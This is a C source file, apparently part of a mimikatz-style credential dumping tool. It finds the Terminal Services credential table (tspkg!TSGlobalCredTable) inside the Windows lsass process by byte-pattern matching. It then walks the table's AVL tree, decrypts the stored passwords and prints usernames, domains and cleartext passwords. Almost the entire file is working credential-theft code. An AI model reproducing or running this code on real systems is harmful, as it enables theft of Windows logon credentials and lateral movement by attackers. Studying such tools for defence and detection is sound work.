#include "stdafx.h"
#include <Windows.h>
#include "tspkg.h"
#include "process.h"
#include "cng.h"

static IMAGE_PATTERN tspkg_TSGlobalCredTable[] = {
	{ 0x000a00003fab0135, 0x85480001556215ff, -4 }, //win10x64 1709
	{ 0x000a000042ee0030, 0x85480001a5ce15ff, -4 }, //win10x64 1803

	{ 0, 0, 0 }
};
LPVOID Find_TSGlobalCredTable()
{
/*
.text:00000001800014E9 48 8D 0D 10 B6 01 00                          lea     rcx, ?TSGlobalCredTable@@3U_RTL_AVL_TABLE@@A ; _RTL_AVL_TABLE TSGlobalCredTable
.text:00000001800014F0 FF 15 62 55 01 00                             call    cs:__imp_RtlLookupElementGenericTableAvl
.text:00000001800014F6 48 85 C0                                      test    rax, rax
*/
	LPVOID lpPtr = NULL;
	HMODULE hModule = LoadLibraryW(L"tspkg");
	RETN_IF(hModule == NULL, L"LoadLibraryW", NULL);

	LPBYTE lpStart = (LPBYTE)hModule;
	LPBYTE lpEnd = (LPBYTE)GetProcAddress(hModule, "SpLsaModeInitialize");
	GOTO_IF(lpEnd == NULL, L"GetProcAddress", cleanup);

	lpPtr = FindPatternFromModule(hModule, (PIMAGE_PATTERN)&tspkg_TSGlobalCredTable, lpStart, lpEnd, 0);
cleanup:
	FreeLibrary(hModule);
	return lpPtr;
}


#define MAX_NAME 64
#define MAX_BUFF 1024
BOOL AVLTable_Node_Dump(IN PRTL_AVL_TABLE lpTable)
{
	RETN_MSG_IF(lpTable == NULL, FALSE, L"");

	RTL_AVL_TABLE  szTSGlobalCredTable = { 0 };
	BOOL   bRet = FALSE;
	bRet = ReadLsassMemory(lpTable, &szTSGlobalCredTable, sizeof(szTSGlobalCredTable));
	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);
	//MESSAGE(L"%p <- -> %p\r\n", szTSGlobalCredTable.BalancedRoot.LeftChild, szTSGlobalCredTable.BalancedRoot.RightChild);
	//MESSAGE(L"OrderedPointer:%p\r\n", szTSGlobalCredTable.OrderedPointer);
	
	if (szTSGlobalCredTable.OrderedPointer != NULL)
	{
		//Win10用此结构，未作其他系统适配
		KIWI_TS_CREDENTIAL_1607 szTSCredential = { 0 };
		bRet = ReadLsassMemory(szTSGlobalCredTable.OrderedPointer, &szTSCredential,
			sizeof(szTSCredential));
		RETN_IF(!bRet, L"ReadProcessMemory", FALSE);

		//MESSAGE(L"pTsPrimary:%p\r\n", szTSCredential.pTsPrimary);
		RETN_MSG_IF(szTSCredential.pTsPrimary == NULL, FALSE, L"");

		KIWI_TS_PRIMARY_CREDENTIAL szTSPrimaryCredential = { 0 };
		bRet = ReadLsassMemory(szTSCredential.pTsPrimary, &szTSPrimaryCredential, sizeof(szTSPrimaryCredential));
		RETN_IF(!bRet, L"ReadProcessMemory", FALSE);

		TCHAR szUserName[MAX_NAME] = { 0 };
		TCHAR szDomain[MAX_NAME] = { 0 };
		if (!ReadLsassLSAString(&szTSPrimaryCredential.credentials.UserName, (LPBYTE)&szUserName))
			szUserName[0] = 0;
		if (!ReadLsassLSAString(&szTSPrimaryCredential.credentials.Domain, (LPBYTE)&szDomain))
			szDomain[0] = 0;
		BYTE szEncPassword[MAX_BUFF] = { 0 };

		MESSAGE(L"%s\\%s: ", szUserName, szDomain);

		if (ReadLsassLSABuffer(&szTSPrimaryCredential.credentials.Password, (LPBYTE)&szEncPassword))
		{
			DWORD cbLength = szTSPrimaryCredential.credentials.Password.MaximumLength;
			LsaEncryptMemory(szEncPassword, cbLength, 0);
			if (cbLength < 100)
			{
				MESSAGE(L"[%s]", (LPWSTR)&szEncPassword);
			}
			else
			{
				HexDump(szEncPassword, cbLength, TRUE);
			}
		}
		MESSAGE(L"\r\n");
	}
		AVLTable_Node_Dump((PRTL_AVL_TABLE)szTSGlobalCredTable.BalancedRoot.LeftChild);
		AVLTable_Node_Dump((PRTL_AVL_TABLE)szTSGlobalCredTable.BalancedRoot.RightChild);

	return TRUE;
}

BOOL Tspkg_TSGlobalCredTable_Dump()
{
	PRTL_AVL_TABLE lpTSGlobalCredTable = (PRTL_AVL_TABLE)Find_TSGlobalCredTable();
	RETN_MSG_IF(lpTSGlobalCredTable == NULL, FALSE, L"Cant find tspkg!TSGlobalCredTable\r\n");
	MESSAGE(L"tspkg!TSGlobalCredTable in lsass 0x%p\r\n", lpTSGlobalCredTable);
	RTL_AVL_TABLE  szTSGlobalCredTable = { 0 };
	BOOL   bRet = FALSE;
	bRet = ReadLsassMemory(lpTSGlobalCredTable, &szTSGlobalCredTable, sizeof(szTSGlobalCredTable));
	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);
	//遍历二叉树结构提取每个节点
	MESSAGE(L"RightChild:%p, LeftChild:%p\r\n", szTSGlobalCredTable.BalancedRoot.RightChild,
		szTSGlobalCredTable.BalancedRoot.LeftChild);
	AVLTable_Node_Dump((PRTL_AVL_TABLE) szTSGlobalCredTable.BalancedRoot.RightChild);

	return TRUE;
}